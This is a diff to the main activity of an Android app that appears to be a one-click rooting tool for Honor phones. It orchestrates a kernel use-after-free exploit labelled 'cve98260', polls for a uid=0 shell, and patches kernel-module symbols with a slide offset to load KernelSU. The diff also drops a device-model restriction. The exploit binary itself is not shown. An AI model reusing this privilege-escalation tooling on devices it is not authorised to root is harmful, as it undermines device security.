+    private String cve98260SuCommand(String arguments) {
+        return "PC98260_SOCK='" + cve98260RootSocket + "' "
+                + WORK + "/cve98260_su " + arguments;
+    }
+
+    private static boolean isSafeCve98260SocketPath(String path) {
+        return path != null
+                && path.length() < 108
+                && path.matches("^/data/local/tmp/cve98260-root[-A-Za-z0-9_.]*\\.sock$");
+    }
+
+    private void waitForCve98260Root() throws Exception {
+        long deadline = System.currentTimeMillis() + TimeUnit.MINUTES.toMillis(5);
+        long nextLog = 0;
+        while (System.currentTimeMillis() < deadline) {
+            String id = probe(cve98260SuCommand("-c 'id' 2>/dev/null")).trim();
+            if (id.contains("uid=0")) {
+                log("98260 root 通道已就绪：" + id.replace("\n", " | "));
+                return;
+            }
+            String tail = probe("tail -n 120 " + WORK
+                    + "/cve98260.log 2>/dev/null");
+            if (tail.contains("missed page; holding zombie"))
+                throw new IllegalStateException(
+                        "98260 多次回收失败并已停放 UAF 进程；请重启设备后再试");
+            String running = probe("pidof cve98260_plant 2>/dev/null").trim();
+            if (running.isEmpty() && tail.isBlank())
+                throw new IllegalStateException(
+                        "98260 进程未启动且没有日志；请重启设备后重试");
+            long now = System.currentTimeMillis();
+            if (now >= nextLog) {
+                logImportantLines(tail, "");
+                nextLog = now + TimeUnit.MINUTES.toMillis(1);
+            }
+            Thread.sleep(5000);
+        }
+        throw new IllegalStateException("98260 等待 root 超时；请重启设备后再次运行");
+    }
+
+    private void logImportantLines(String text, String prefix) {
+        int shown = 0;
+        for (String line : text.split("\\r?\\n")) {
+            String trimmed = line.trim();
+            if (trimmed.isEmpty()) continue;
+            if (!prefix.isEmpty() && !trimmed.contains(prefix)) continue;
+            log("  " + (trimmed.length() > 220 ? trimmed.substring(0, 220) + "…" : trimmed));
+            if (++shown >= 12) return;
+        }
+    }
+
+    private void finishRoot(ExploitChoice route, boolean reused) {
+        setKernelState("运行中", true);
+        stage("完成");
+        ui.post(() -> uiState.completeCurrentStage());
+        progress(100);
+        showRootReady();
+        log(reused
+                ? "🎉 root 已就绪；已复用当前内核中的 KernelSU。"
+                : "🎉 root 成功；利用链 " + route.getLabel()
+                        + "，KernelSU 管理器已可管理授权与模块。");
+        launchPackage(MANAGER);
     }
 
     private String initializeKernelSU() throws Exception {
@@ -717,16 +1256,27 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         return slide;
     }
 
-    private Map<String, Long> loadSymbols() throws Exception {
-        byte[] data = readAsset("syms.txt");
+    private Map<String, Long> loadSymbols(String assetName) throws Exception {
+        return parseSymbolMap(readProfileResource(assetName));
+    }
+
+    static Map<String, Long> parseSymbolMap(byte[] data) {
         Map<String, Long> map = new HashMap<>(180000);
-        for (String line : new String(data, StandardCharsets.UTF_8).split("\\n")) {
+        for (String line : new String(data, StandardCharsets.UTF_8).split("\n")) {
             String s = line.trim();
-            int sp = s.indexOf(' ');
-            if (sp <= 0) continue;
+            String[] parts = s.split("\\s+", 3);
+            if (parts.length < 2) continue;
             try {
-                long value = Long.parseUnsignedLong(s.substring(0, sp), 16);
-                map.put(s.substring(sp + 1).trim(), value);
+                long value = Long.parseUnsignedLong(parts[0], 16);
+                String name;
+                if (parts.length == 3 && parts[1].length() == 1
+                        && Character.isLetter(parts[1].charAt(0))) {
+                    name = parts[2];
+                } else {
+                    int sp = s.indexOf(' ');
+                    name = s.substring(sp + 1).trim();
+                }
+                map.put(name, value);
             } catch (NumberFormatException ignored) {}
         }
         return map;
@@ -738,13 +1288,26 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         int shentsize = b.getShort(0x3a) & 0xffff;
         int shnum = b.getShort(0x3c) & 0xffff;
         int shstr = b.getShort(0x3e) & 0xffff;
-        int strSec = -1, symSec = -1;
+        int symSec = -1, modInfoSec = -1;
         for (int i = 0; i < shnum; i++) {
             int p = (int)(shoff + (long) i * shentsize);
             int type = b.getInt(p + 4);
             if (type == 2) symSec = i;
         }
         if (symSec < 0) throw new IllegalStateException("module 无 symtab");
+        int shstrHdr = (int)(shoff + (long) shstr * shentsize);
+        int shstrOff = (int)b.getLong(shstrHdr + 24);
+        int shstrSize = (int)b.getLong(shstrHdr + 32);
+        for (int i = 0; i < shnum; i++) {
+            int p = (int)(shoff + (long) i * shentsize);
+            int nameOff = b.getInt(p);
+            if (nameOff <= 0 || nameOff >= shstrSize) continue;
+            int end = shstrOff + nameOff;
+            while (end < shstrOff + shstrSize && raw[end] != 0) end++;
+            String name = new String(raw, shstrOff + nameOff,
+                    end - shstrOff - nameOff, StandardCharsets.UTF_8);
+            if (".modinfo".equals(name)) modInfoSec = i;
+        }
         int symHdr = (int)(shoff + (long) symSec * shentsize);
         int symOff = (int)b.getLong(symHdr + 24);
         int symSize = (int)b.getLong(symHdr + 32);
@@ -753,21 +1316,36 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         int strOff = (int)b.getLong(strHdr + 24);
         int strSize = (int)b.getLong(strHdr + 32);
         int patched = 0;
+        int repaired = 0;
+        int undefined = 0;
         for (int p = symOff; p + 24 <= symOff + symSize; p += 24) {
             int nameOff = b.getInt(p);
             int shndx = b.getShort(p + 6) & 0xffff;
+            if (shndx == 0xffff) {
+                if (modInfoSec < 0) throw new IllegalStateException(
+                        "module 含损坏节索引但无 .modinfo");
+                b.putShort(p + 6, (short)modInfoSec);
+                repaired++;
+                continue;
+            }
             if (nameOff <= 0 || nameOff >= strSize) continue;
             int end = strOff + nameOff;
             while (end < strOff + strSize && raw[end] != 0) end++;
             String name = new String(raw, strOff + nameOff, end - strOff - nameOff,
                     StandardCharsets.UTF_8);
+            if (shndx != 0) continue;
+            undefined++;
             Long value = symbols.get(name);
-            if (shndx != 0 || value == null) continue;
+            if (value == null) continue;
             b.putShort(p + 6, (short)0xfff1);
             b.putLong(p + 8, value + slide);
             patched++;
         }
-        if (patched == 0) throw new IllegalStateException("模块符号补丁为空");
+        if (patched == 0) throw new IllegalStateException(
+                "模块符号补丁为空（未定义=" + undefined + "，匹配=" + patched + "）");
+        if (repaired > 0) {
+            Log.i("HOneClick", "module repaired section indexes=" + repaired);
+        }
         return raw;
     }
 
@@ -789,7 +1367,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         String out = new String(stdout.toByteArray(), StandardCharsets.UTF_8);
         String err = new String(stderr.toByteArray(), StandardCharsets.UTF_8);
         if (code != 0 || !err.isBlank())
-            log("命令返回 " + code + (err.isBlank() ? "" : "：" + err.trim()));
+            logError("命令返回 " + code + (err.isBlank() ? "" : "：" + err.trim()));
         if (!exited) throw new IllegalStateException("shell 命令执行超时");
         return out + err;
     }
@@ -803,7 +1381,8 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         IRemoteProcess remote = service.newProcess(
                 new String[]{"sh", "-c", command},
                 new String[]{"PATH=/system/bin:/system/xbin:/data/adb/ksu/bin",
-                        "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp"},
+                        "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp",
+                        "HONOR_WORK=" + (WORK == null ? "/data/local/tmp/honor" : WORK)},
                 "/data/local/tmp");
         if (remote == null) throw new IllegalStateException("Shizuku 拒绝启动 shell");
         return new RemoteProcess(remote);
@@ -822,7 +1401,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         int code = p.waitFor();
         if (code != 0) {
             String error = readAll(p.getErrorStream());
-            log("[文件失败] " + name + " exit=" + code + "\n" + error);
+            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
             throw new IllegalStateException("stage failed: " + name);
         }
     }
@@ -833,13 +1412,15 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     }
 
     private void prepareWorkDirectory() throws Exception {
-        shell("cd /data/local/tmp"
-                + " && if [ -L honor ]; then rm -f honor; fi"
-                + " && if [ -d honor ]; then mv honor honor.old.$(date +%s) 2>/dev/null || true; fi"
-                + " && rm -rf honor-run"
-                + " && mkdir -m 711 honor-run"
-                + " && ln -s honor-run honor");
-        log("staging=" + WORK + " -> /data/local/tmp/honor-run");
+        String candidate = "/data/local/tmp/honor-run-"
+                + Long.toHexString(System.nanoTime());
+        shell("mkdir -m 711 '" + candidate + "'");
+        String check = shell("test -d '" + candidate
+                + "' && test -w '" + candidate + "' && echo WORKDIR_OK");
+        if (!check.contains("WORKDIR_OK"))
+            throw new IllegalStateException("无法创建可写工作目录：" + candidate);
+        WORK = candidate;
+        log("staging=" + WORK);
     }
 
     private void stageBytes(String name, byte[] data, String mode) throws Exception {
@@ -848,13 +1429,25 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         int code = p.waitFor();
         if (code != 0) {
             String error = readAll(p.getErrorStream());
-            log("[文件失败] " + name + " exit=" + code + "\n" + error);
+            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
             throw new IllegalStateException("stage bytes failed: " + name);
         }
     }
 
     private byte[] readAsset(String name) throws Exception {
         try (InputStream in = getAssets().open(name)) { return readAllBytes(in); }
+    }
+
+    private byte[] readProfileResource(String path) throws Exception {
+        File file = new File(path);
+        if (file.isAbsolute()) return readFileBytes(file);
+        return readAsset(path);
+    }
+
+    private static byte[] readFileBytes(File file) throws Exception {
+        try (FileInputStream in = new FileInputStream(file)) {
+            return readAllBytes(in);
+        }
     }
 
     private static byte[] readAllBytes(InputStream in) throws Exception {
@@ -999,8 +1592,8 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     }
 
     private void stage(String name) {
-        log("\n== " + name + " ==");
         progress(Math.min(95, progressValue + 7));
+        ui.post(() -> uiState.startStage(name));
     }
 
     private void progress(int p) {
@@ -1008,14 +1601,14 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         ui.post(() -> uiState.setProgress(p));
     }
     private void log(String s) {
+        Log.i("HOneClick", s);
+    }
+
+    private void logError(String s) {
+        Log.e("HOneClick", s);
         ui.post(() -> uiState.appendLog(s));
     }
     private int dp(int n) { return Math.round(n * getResources().getDisplayMetrics().density); }
-
-    private static boolean isSupportedModel(String model) {
-        return "WKL-AN20".equalsIgnoreCase(model)
-                || "WKL-AN80".equalsIgnoreCase(model);
-    }
 
     private void setKernelState(String label, boolean good) {
         ui.post(() -> uiState.setKernelState(label));
